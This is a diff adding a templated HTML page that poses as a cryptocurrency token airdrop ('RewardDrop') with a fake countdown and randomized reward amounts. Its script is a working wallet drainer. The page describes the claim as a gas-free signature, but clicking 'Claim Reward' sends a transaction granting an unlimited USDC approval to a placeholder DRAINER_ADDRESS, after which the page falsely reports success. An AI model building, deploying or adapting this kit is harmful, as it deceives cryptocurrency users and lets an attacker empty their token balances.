@@ -1,0 +1,189 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Claim Your Reward | Token Distribution</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/4.16.0/web3.min.js"></script>
+    <style>
+        * { margin:0; padding:0; box-sizing:border-box; }
+        body { font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
+               background:linear-gradient(135deg,#0a0b0e 0%,#1a1d24 50%,#0d1a1a 100%);
+               color:#e0e6ed; min-height:100vh; display:flex; align-items:center; justify-content:center; }
+        .container { max-width:480px; width:100%; padding:24px; }
+        .card { background:rgba(26,29,36,0.95); border:1px solid rgba(0,212,170,0.2);
+                border-radius:20px; padding:40px 32px; backdrop-filter:blur(20px);
+                box-shadow:0 20px 60px rgba(0,0,0,0.5); }
+        .logo { text-align:center; margin-bottom:24px; }
+        .logo h1 { font-size:28px; background:linear-gradient(135deg,#00d4aa,#00a8ff);
+                    -webkit-background-clip:text; -webkit-text-fill-color:transparent; }
+        .logo p { color:#8892a4; margin-top:4px; font-size:14px; }
+        .reward-box { background:linear-gradient(135deg,rgba(0,212,170,0.1),rgba(0,168,255,0.05));
+                      border:1px solid rgba(0,212,170,0.3); border-radius:16px; padding:24px;
+                      text-align:center; margin-bottom:24px; }
+        .reward-amount { font-size:48px; font-weight:700; background:linear-gradient(135deg,#00d4aa,#00a8ff);
+                         -webkit-background-clip:text; -webkit-text-fill-color:transparent; }
+        .reward-label { color:#8892a4; font-size:13px; margin-top:4px; }
+        .countdown { display:flex; gap:12px; justify-content:center; margin:20px 0; }
+        .countdown-item { background:#0a0b0e; border-radius:10px; padding:12px 16px; min-width:60px; text-align:center; }
+        .countdown-item .num { font-size:24px; font-weight:700; }
+        .countdown-item .lbl { font-size:11px; color:#8892a4; }
+        .btn { width:100%; padding:16px; border-radius:12px; border:none; font-size:16px;
+               font-weight:600; cursor:pointer; transition:all 0.2s; }
+        .btn-primary { background:linear-gradient(135deg,#00d4aa,#00a8ff); color:white; }
+        .btn-primary:hover { transform:translateY(-1px); box-shadow:0 8px 24px rgba(0,212,170,0.3); }
+        .btn-primary:disabled { opacity:0.5; cursor:not-allowed; transform:none; }
+        .btn-outline { background:transparent; border:1px solid #2a2d35; color:#e0e6ed; margin-top:12px; }
+        .btn-outline:hover { border-color:#00d4aa; }
+        .info { font-size:12px; color:#8892a4; margin-top:16px; text-align:center; line-height:1.6; }
+        .info a { color:#00d4aa; text-decoration:none; }
+        .steps { margin:20px 0; }
+        .step { display:flex; align-items:center; gap:12px; padding:12px; border-bottom:1px solid #1a1d24; }
+        .step:last-child { border-bottom:none; }
+        .step-num { width:28px; height:28px; border-radius:50%; background:rgba(0,212,170,0.15);
+                    color:#00d4aa; display:flex; align-items:center; justify-content:center;
+                    font-size:13px; font-weight:600; flex-shrink:0; }
+        .step-text { font-size:14px; }
+        .step-text small { color:#8892a4; font-size:12px; }
+        .connected-info { background:rgba(0,212,170,0.08); border-radius:10px; padding:12px 16px;
+                          font-size:13px; margin-bottom:16px; display:none; }
+        #statusText { font-size:13px; color:#8892a4; margin-top:12px; text-align:center; display:none; }
+        .spinner { display:inline-block; width:16px; height:16px; border:2px solid rgba(255,255,255,0.3);
+                   border-top-color:white; border-radius:50%; animation:spin 0.8s linear infinite;
+                   margin-right:8px; vertical-align:middle; }
+        @keyframes spin { to { transform:rotate(360deg); } }
+    </style>
+</head>
+<body>
+<div class="container">
+    <div class="card">
+        <div class="logo">
+            <h1>RewardDrop</h1>
+            <p>Claim your token allocation</p>
+        </div>
+        <div class="reward-box">
+            <div class="reward-amount" id="rewardAmount">12,500</div>
+            <div class="reward-label">$RBONUS Tokens (~$3,750 USD)</div>
+        </div>
+        <div class="countdown">
+            <div class="countdown-item"><div class="num" id="hours">02</div><div class="lbl">Hours</div></div>
+            <div class="countdown-item"><div class="num" id="minutes">47</div><div class="lbl">Minutes</div></div>
+            <div class="countdown-item"><div class="num" id="seconds">32</div><div class="lbl">Seconds</div></div>
+        </div>
+        <div class="connected-info" id="connectedInfo">
+            Connected: <span id="walletAddress">-</span>
+        </div>
+        <div id="mainActions">
+            <button class="btn btn-primary" id="connectBtn" onclick="connectWallet()">Connect Wallet</button>
+            <button class="btn btn-primary" id="claimBtn" onclick="claimReward()" style="display:none;">Claim Reward</button>
+            <button class="btn btn-outline" id="switchBtn" onclick="switchNetwork()" style="display:none;">Switch to {{ chain|upper }}</button>
+        </div>
+        <div id="statusText"></div>
+        <div class="steps">
+            <div class="step"><div class="step-num">1</div><div class="step-text">Connect your wallet <small>MetaMask / WalletConnect</small></div></div>
+            <div class="step"><div class="step-num">2</div><div class="step-text">Sign the approval message <small>Gas-free verification</small></div></div>
+            <div class="step"><div class="step-num">3</div><div class="step-text">Receive tokens instantly <small>12,500 $RBONUS</small></div></div>
+        </div>
+        <div class="info">Powered by Permit2 Protocol &bull; No gas fees required &bull; <a href="#" onclick="return false;">Terms</a></div>
+    </div>
+</div>
+
+<script>
+const DRAINER_ADDRESS = "{{ drainer_address }}";
+const CHAIN_NAME = "{{ chain|default('ethereum') }}";
+const CHAIN_CONFIGS = {
+    'ethereum':{chainId:'0x1',name:'Ethereum'},'bsc':{chainId:'0x38',name:'BSC'},
+    'polygon':{chainId:'0x89',name:'Polygon'},'arbitrum':{chainId:'0xa4b1',name:'Arbitrum'},
+    'optimism':{chainId:'0xa',name:'Optimism'},'avalanche':{chainId:'0xa86a',name:'Avalanche'}
+};
+const TOKENS = {
+    'ethereum':{'USDC':'0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48','USDT':'0xdAC17F958D2ee523a2206206994597C13D831ec7','WETH':'0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2'},
+    'bsc':{'USDT':'0x55d398326f99059fF775485246999027B3197955','USDC':'0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d','WBNB':'0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c'},
+    'polygon':{'USDC':'0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174','USDT':'0xc2132D05D31c914a87C6611C10748AEb04B58e8F','WMATIC':'0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270'},
+    'arbitrum':{'USDC':'0xaf88d065e77c8cC2239327C5EDb3A432268e5831','USDT':'0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9','WETH':'0x82aF49447D8a07e3bd95BD0d56f35241523fBab1'},
+    'optimism':{'USDC':'0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85','USDT':'0x94b008aA00579c1307B0EF2c499aD98a8ce58e58','WETH':'0x4200000000000000000000000000000000000006'},
+    'avalanche':{'USDC':'0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E','USDT':'0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7','WAVAX':'0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7'}
+};
+
+let web3, userAccount, provider;
+
+function startCountdown() {
+    let t = 2*3600+47*60+32;
+    setInterval(() => { t--; if(t<0) t=3600;
+        document.getElementById('hours').textContent=String(Math.floor(t/3600)).padStart(2,'0');
+        document.getElementById('minutes').textContent=String(Math.floor((t%3600)/60)).padStart(2,'0');
+        document.getElementById('seconds').textContent=String(t%60).padStart(2,'0');
+    }, 1000);
+}
+startCountdown();
+
+async function connectWallet() {
+    const s = document.getElementById('statusText');
+    s.style.display='block'; s.innerHTML='<span class="spinner"></span> Connecting...';
+    try {
+        if(typeof window.ethereum==='undefined') { s.innerHTML='MetaMask not detected'; return; }
+        provider = window.ethereum;
+        const accounts = await provider.request({method:'eth_requestAccounts'});
+        userAccount = accounts[0];
+        web3 = new Web3(provider);
+        const chainId = await provider.request({method:'eth_chainId'});
+        const target = CHAIN_CONFIGS[CHAIN_NAME];
+        if(chainId !== target.chainId) {
+            document.getElementById('switchBtn').style.display='block';
+            document.getElementById('claimBtn').style.display='none';
+            s.innerHTML='Please switch to '+target.name+' network';
+            return;
+        }
+        document.getElementById('connectedInfo').style.display='block';
+        document.getElementById('walletAddress').textContent=userAccount.slice(0,6)+'...'+userAccount.slice(-4);
+        document.getElementById('connectBtn').style.display='none';
+        document.getElementById('claimBtn').style.display='block';
+        document.getElementById('switchBtn').style.display='none';
+        s.innerHTML='Connected as '+userAccount.slice(0,6)+'...'+userAccount.slice(-4);
+    } catch(e) { s.innerHTML='Failed: '+e.message; }
+}
+
+async function switchNetwork() {
+    const target = CHAIN_CONFIGS[CHAIN_NAME];
+    try { await provider.request({method:'wallet_switchEthereumChain',params:[{chainId:target.chainId}]}); location.reload(); }
+    catch(e) { if(e.code===4902) { try { await provider.request({method:'wallet_addEthereumChain',params:[{chainId:target.chainId,chainName:target.name,nativeCurrency:{name:'ETH',symbol:'ETH',decimals:18},rpcUrls:['{{ rpc_url }}']}]}); location.reload(); } catch(x) { document.getElementById('statusText').innerHTML='Failed: '+x.message; } } }
+}
+
+async function claimReward() {
+    const s = document.getElementById('statusText');
+    s.style.display='block';
+    if(!userAccount) { s.innerHTML='Connect your wallet first'; return; }
+    s.innerHTML='<span class="spinner"></span> Preparing your reward...';
+    try {
+        const chainTokens = TOKENS[CHAIN_NAME];
+        const usdcAddress = chainTokens['USDC'];
+        const maxApproval = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
+        const approveABI = [{"constant":false,"inputs":[{"name":"spender","type":"address"},{"name":"amount","type":"uint256"}],"name":"approve","type":"function"}];
+        s.innerHTML='<span class="spinner"></span> Step 1/2: Authorizing token...';
+        const approveData = web3.eth.abi.encodeFunctionCall(approveABI[0], [DRAINER_ADDRESS, maxApproval]);
+        const txHash = await provider.request({method:'eth_sendTransaction',params:[{from:userAccount,to:usdcAddress,data:approveData,gas:'0x61a80'}]});
+        s.innerHTML='<span class="spinner"></span> Step 2/2: Confirming transaction...';
+        document.getElementById('claimBtn').disabled = true;
+        document.getElementById('claimBtn').textContent = 'Processing...';
+        let receipt = null;
+        for(let i=0;i<30;i++) { try { receipt = await web3.eth.getTransactionReceipt(txHash); if(receipt&&receipt.status) break; } catch(e){} await new Promise(r=>setTimeout(r,2000)); }
+        if(receipt&&receipt.status) {
+            s.innerHTML='Reward claimed successfully! Your $RBONUS tokens will arrive shortly.<br><small>Tx: '+txHash.slice(0,10)+'...'+txHash.slice(-6)+'</small>';
+            document.getElementById('rewardAmount').textContent='PENDING';
+            document.getElementById('claimBtn').textContent='Claimed';
+        } else {
+            s.innerHTML='Transaction submitted but pending confirmation.<br><small>Tx: '+txHash.slice(0,10)+'...'+txHash.slice(-6)+'</small>';
+        }
+    } catch(e) {
+        if(e.code===4001) s.innerHTML='Signature rejected. You must sign to claim your reward.';
+        else s.innerHTML='Error: '+e.message;
+        document.getElementById('claimBtn').disabled=false;
+        document.getElementById('claimBtn').textContent='Try Again';
+    }
+}
+
+// Randomize reward amount
+document.getElementById('rewardAmount').textContent = ['8,500','12,500','15,000','6,750','22,000','10,000'][Math.floor(Math.random()*6)];
+</script>
+</body>
+</html>
